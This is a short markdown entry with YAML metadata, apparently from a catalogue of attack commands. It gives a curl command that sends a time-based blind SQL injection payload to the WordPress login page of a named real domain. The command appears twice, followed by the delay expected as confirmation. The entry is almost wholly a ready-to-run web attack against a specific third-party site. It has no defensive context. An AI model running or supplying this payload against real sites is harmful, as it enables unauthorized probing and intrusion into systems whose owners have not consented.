---
id: cmd-curl-sleep-3-001
data: >-
  curl -X POST https://www.acronis.cz/wp-login.php -d
  "log=0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z&pwd=test&wp-submit=Log+In" -w
  "%{time_total}s"
tags:
  - sqli
  - blind-sqli
type: command
output: Response time of approximately 3.463 seconds.
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.521Z'
verified: false
validated: true
submitted: true
---
# curl-inject-sleep-3

## Command

```bash
curl -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

## Description

Injects 3-second sleep for delay verification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | sleep(3) payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

## Expected Output

~3.463s.

## Related

- [[Related Procedure: Confirm SQLi with Varying Sleep Durations]]
